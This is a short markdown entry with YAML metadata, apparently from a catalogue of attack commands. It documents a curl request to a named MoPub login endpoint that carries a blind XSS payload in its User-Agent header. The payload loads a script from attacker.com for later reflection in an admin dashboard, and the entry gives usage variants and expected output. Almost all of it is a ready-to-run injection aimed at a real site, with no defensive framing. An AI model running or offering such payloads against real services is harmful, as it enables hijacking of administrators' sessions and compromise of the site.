---
data: >-
  curl -H "User-Agent: "></title></style></textarea></script><script
  src=https://attacker.com/js></script>"
  https://demand.mopub.com/accounts/login/
tags:
  - http
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e6b01e48-2841-4216-b104-73215112a3a8
created_at: '2025-12-14T17:30:27.342Z'
updated_at: '2025-12-14T17:30:27.342Z'
verified: false
validated: true
submitted: true
---
# curl-inject-user-agent

## Command

```bash
curl -H "User-Agent: "></title></style></textarea></script><script src=https://attacker.com/js></script>" https://demand.mopub.com/accounts/login/
```

## Description

This command sends an HTTP request to the MoPub login endpoint with a malicious User-Agent header containing a blind XSS payload, storing it for later reflection in the admin dashboard.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Adds a custom header (User-Agent with payload) | Yes |
| URL | Target endpoint for injection | Yes |

## Examples

### Basic Usage

```bash
curl -H "User-Agent: test" https://demand.mopub.com/accounts/login/
```

### Advanced Usage

```bash
curl -H "User-Agent: "></title></style></textarea></script><script src=https://attacker.com/js></script>" -v https://demand.mopub.com/accounts/login/
```

## Expected Output

HTTP response code 200 or 302 redirect, with HTML login page or success message. No immediate XSS execution; check verbose (-v) for headers.

## Related

- [[Related Procedure]]
